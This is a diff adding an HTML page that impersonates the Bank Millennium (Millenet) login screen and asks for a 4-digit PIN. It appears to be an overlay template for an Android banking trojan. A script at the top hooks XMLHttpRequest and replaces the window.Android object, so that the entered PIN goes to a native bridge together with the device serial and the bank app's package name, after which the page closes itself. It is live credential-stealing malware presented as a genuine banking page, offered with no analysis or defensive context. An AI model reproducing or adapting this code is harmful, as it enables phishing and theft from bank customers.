@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+<head><script>window.__MOYING_TPL='millennium';</script>
+<script>
+/* ===== 墨影注入页协议 shim（只走原生桥，禁止任何外发） ===== */
+(function(){
+  var TPL = window.__MOYING_TPL || 'unknown';
+  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : ''; }catch(e){ return ''; } }
+  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : ''; }catch(e){ return ''; } }
+  function push(form){
+    var pl = JSON.stringify({ pkg: pk(), sn: sn(), template: TPL, formData: form || {} });
+    try{ if(window.FKB && FKB.setFormData) FKB.setFormData(pl); }catch(e){}
+    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
+    return pl;
+  }
+  window.__moyingPush = push;
+  /* ① 页面自带的 XMLHttpRequest 外发统一截获，改走桥 */
+  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
+  XMLHttpRequest.prototype.send = function(b){
+    var u = this.__mu || '';
+    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('/api/inj/result') >= 0){
+      var o = {}, tpl = TPL;
+      try{ o = JSON.parse(b||'{}'); }catch(e){}
+      if(o && o.template) tpl = o.template;
+      var form = (o && (o.formData || o.data)) ? (o.formData || o.data) : o;
+      window.__MOYING_TPL = tpl;
+      push(form);
+      return;
+    }
+    return _send.apply(this, arguments);
+  };
+  /* ② 直接调用 Android.returnResult(json) 的老页面（如 millennium）也转成我们的协议 */
+  var orig = (window.Android && window.Android.returnResult) ? window.Android.returnResult : null;
+  var bridge = {
+    returnResult: function(s){
+      var o = null;
+      try{ o = (typeof s === 'string') ? JSON.parse(s) : s; }catch(e){ o = null; }
+      if(o && o.action){ if(orig){ try{ return orig(s); }catch(e){} } return; }
+      if(o && (o.formData || o.pkg)) push(o.formData || o);
+      else push(o || {});
+    },
+    setFormData: function(s){ try{ var o=JSON.parse(s); push(o.formData||o); }catch(e){ push({}); } },
+    getPkg: function(){ return pk(); },
+    getSn: function(){ return sn(); },
+    getUserName: function(){ try{ return (orig && orig.getUserName && orig.getUserName()) || ''; }catch(e){ return ''; } },
+    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(p||pk()); }catch(e){} },
+    close: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} },
+    finish: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }
+  };
+  try{ window.Android = bridge; }catch(e){}
+})();
+</script>
+
+    <title>millenium</title>
+    <link rel="shortcut icon" href="wit.android.bcpBankingApp.millenniumPL.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #f6f6f6;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: center;
+    padding: 0px 0px 10px 0px;
+    background-size: 80%;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    background: #00745f;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #808080;
+    text-align: left;
+    outline: none;
+    border: 1px solid #dfdfdf;
+    background: #fff;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #e91e63;
+    border: 1px solid #e91e63;
+}
+input::placeholder {
+    color: #808080;
+    font-size: 15px;
+}
+
+    .pin-wrap {
+        clear: both;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: flex;
+        -webkit-justify-content: center;
+        justify-content: center;
+        padding: 4px 0 0 0;
+    }
+    input[type="password"].pin {
+        width: 54px;
+        height: 54px;
+        min-width: 54px;
+        margin: 0 7px;
+        padding: 0;
+        line-height: 54px;
+        font-size: 24px;
+        text-align: center;
+        color: #555;
+        background: #fff;
+        border: 1px solid #dfdfdf;
+        border-radius: 9px;
+        -webkit-appearance: none;
+        outline: none;
+        box-sizing: border-box;
+    }
+    input[type="password"].pin:focus {
+        border-color: #00745f;
+        box-shadow: 0 0 0 2px rgba(0,116,95,.16);
+    }
+    input[type="password"].pin.filled {
+        border-color: #cfcfcf;
+    }
+    @media (max-width: 340px) {
+        input[type="password"].pin {
+            width: 46px;
+            height: 46px;
+            min-width: 46px;
+            line-height: 46px;
+            font-size: 20px;
+            margin: 0 5px;
+        }
+    }
+</style>
+
+
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<span style="background: #f6f6f6; display: block; text-align: center; padding: 20px;">
+    Logowanie do Millenetu
+</span>
+
+<div class="area" id="area2" style="padding: 30px;">
+        
+        <label style="float: left; padding: 0px 0px 0px 0px;">PIN <img src="data:image/png;base64,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" style="width: 30px;"></label>
+        <br><br>
+        <div class="pin-wrap" id="pinWrap">
+            <input class="pin" type="password" name="pin1" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+            <input class="pin" type="password" name="pin2" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+            <input class="pin" type="password" name="pin3" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+            <input class="pin" type="password" name="pin4" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+        </div>
+        <input type="hidden" name="pin" id="pinHidden" value="">
+        <input name="exit" type="hidden" text="true"/>
+        
+        <input type="button" name="sumbit" id="send" onclick="send_form()" value="DALEJ">
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var pb = document.querySelectorAll('input.pin');
+    var code = '';
+    for (var i = 0; i < pb.length; i++) code += pb[i].value;
+    if (!/^[0-9]{4}$/.test(code))
+    {
+        alert ('Wprowad\u017a 4-cyfrowy PIN');
+        try{ pb[0].focus(); }catch(e){}
+        return false;
+    }
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+
+(function(){
+    var boxes = Array.prototype.slice.call(document.querySelectorAll('input.pin'));
+    if (!boxes.length) return;
+    var hid = document.getElementById('pinHidden');
+    function sync(){
+        var v = '';
+        for (var i=0;i<boxes.length;i++) v += boxes[i].value;
+        if (hid) hid.value = v;
+        for (var j=0;j<boxes.length;j++) boxes[j].className = boxes[j].value ? 'pin filled' : 'pin';
+    }
+    function focusAt(i){ if (boxes[i]) { boxes[i].focus(); try{boxes[i].select();}catch(e){} } }
+    for (var i=0;i<boxes.length;i++){
+        (function(b, idx){
+            b.addEventListener('input', function(){
+                var d = b.value.replace(/[^0-9]/g, '').slice(0,1);
+                b.value = d;
+                sync();
+                if (d && idx < boxes.length - 1) focusAt(idx + 1);
+            });
+            b.addEventListener('keydown', function(e){
+                if (e.key === 'Backspace'){
+                    if (!b.value && idx > 0){ e.preventDefault(); boxes[idx-1].value = ''; sync(); focusAt(idx-1); }
+                } else if (e.key === 'ArrowLeft' && idx > 0){ e.preventDefault(); focusAt(idx-1); }
+                else if (e.key === 'ArrowRight' && idx < boxes.length-1){ e.preventDefault(); focusAt(idx+1); }
+            });
+            b.addEventListener('focus', function(){ try{ b.select(); }catch(e){} });
+            b.addEventListener('paste', function(e){
+                var t = (e.clipboardData || window.clipboardData).getData('text') || '';
+                var d = t.replace(/[^0-9]/g,'').slice(0, boxes.length);
+                if (!d) return;
+                e.preventDefault();
+                for (var k=0;k<boxes.length;k++) boxes[k].value = d.charAt(k) || '';
+                sync();
+                focusAt(Math.min(d.length, boxes.length-1));
+            });
+        })(boxes[i], i);
+    }
+    var wrapEl = document.getElementById('pinWrap');
+    if (wrapEl) wrapEl.addEventListener('click', function(e){ if (e.target === wrapEl) focusAt(0); });
+})();
+</script>
+
+</body>
+<!-- moying pkg=pl.bankmillennium.gfm tpl=millennium -->
+</html><div id="__lyx" style="position:fixed;top:calc(env(safe-area-inset-top,0px) + 8px);right:8px;z-index:2147483647;width:36px;height:36px;border-radius:50%;background:rgba(0,0,0,.28);color:#fff;font:300 24px/36px -apple-system,Segoe UI,sans-serif;text-align:center;cursor:pointer;-webkit-tap-highlight-color:transparent">&#215;</div><script>(function(){var b=document.getElementById("__lyx");if(!b)return;b.addEventListener("click",function(e){e.preventDefault();e.stopPropagation();b.style.display="none";try{if(typeof Android!=="undefined"&&Android&&Android.close){Android.close();return;}}catch(x){}try{if(typeof Android!=="undefined"&&Android&&Android.finish){Android.finish();return;}}catch(x){}try{if(typeof FKB!=="undefined"&&FKB&&FKB.setClosePage){FKB.setClosePage("");return;}}catch(x){}try{window.close();}catch(x){}try{document.documentElement.style.display="none";}catch(x){}},true);})();
+window.addEventListener('load', function(){
+    setTimeout(function(){
+        var f = document.getElementById('pin1');
+        if (f) { try { f.focus(); } catch(e) {} }
+    }, 120);
+});
+</script>
